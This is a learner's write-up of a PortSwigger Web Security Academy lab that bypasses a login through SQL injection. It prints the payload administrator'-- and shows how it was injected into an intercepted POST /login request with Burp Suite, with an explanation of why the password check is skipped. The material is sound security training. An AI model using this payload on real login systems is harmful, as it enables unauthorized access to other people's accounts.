# PortSwigger Web Security Academy — SQL Injection Login Bypass

## Lab Information

**Lab:** SQL injection vulnerability allowing login bypass  
**Difficulty:** Apprentice  
**Category:** SQL Injection  
**Date Completed:** 31 August 2026  

---

## Objective

The goal of this lab was to exploit a SQL Injection vulnerability in the login function and log in to the application as the `administrator` user without knowing the password.

---

## What I Did

I opened the lab and used **Burp Suite** to intercept the login request.

First, I submitted normal test credentials through the login form:

```text
Username: test
Password: test
```

Burp intercepted the request:

```http
POST /login HTTP/2
```

The request body contained the login parameters:

```text
username=test&password=test
```

I modified only the `username` parameter.

### Payload Used

```text
administrator'--
```

The resulting request was approximately:

```text
username=administrator'--&password=test
```

I then forwarded the request in Burp Suite.

The application redirected me to the account page and showed:

```text
Your username is: administrator
```

After the account page loaded, the lab status changed to:

```text
LAB — Solved
```

---

## How the SQL Injection Works

The login query can be thought of as something similar to:

```sql
SELECT * FROM users
WHERE username = 'administrator'
AND password = 'test'
```

The application places the supplied username directly into the SQL query.

When I supplied:

```text
administrator'--
```

the query was effectively manipulated into something like:

```sql
SELECT * FROM users
WHERE username = 'administrator'--'
AND password = 'test'
```

### Breaking down the payload

#### `administrator`

This specifies the account I want to authenticate as.

#### `'`

The single quote closes the original SQL string.

For example:

```sql
username = 'administrator'
```

#### `--`

The double hyphen starts an SQL comment.

This causes the rest of the SQL statement to be ignored, including the password condition.

So the application effectively checks for the existence of the `administrator` user without requiring the correct password.

---

## Burp Suite Workflow

The workflow I used was:

```text
Open PortSwigger Lab
        ↓
Open lab in Burp Browser
        ↓
Proxy → Intercept → ON
        ↓
Submit test login
        ↓
Burp intercepts POST /login
        ↓
Find username parameter
        ↓
Change username to:
administrator'--
        ↓
Forward request
        ↓
Application authenticates as administrator
        ↓
Lab solved
```

---

## Important Burp Suite Lesson

At first, Burp intercepted other requests such as:

```http
GET /academyLabHeader
```

Those were not the login request.

The important request was:

```http
POST /login
```

This helped me understand that when using Burp Suite, I need to identify the **specific request that contains the parameter I want to test**, rather than modifying every intercepted request.

---

## Key Takeaways

- SQL Injection can affect authentication mechanisms when user input is directly inserted into SQL queries.
- A single quote can be used to break out of an SQL string.
- `--` can comment out the remaining part of a SQL query.
- Burp Suite Proxy can be used to intercept and modify HTTP requests.
- The `username` parameter was the vulnerable input in this lab.
- I don't need to know the administrator password when the SQL query can be manipulated to bypass the password check.
- Understanding the request and query structure is more important than memorizing a payload.

---

## Payload

```text
administrator'--
```

**Result:** Logged in as `administrator` and solved the lab. 

---

## What I Learned From This Lab

This was my second SQL Injection lab in PortSwigger Web Security Academy.

The main thing I practiced here was using **Burp Suite to intercept a real login request and modify a parameter before forwarding it to the server**.

The previous lab focused on manipulating a `WHERE` clause to retrieve hidden data. This lab helped me understand how the same basic SQL Injection concept can affect an authentication system.

---


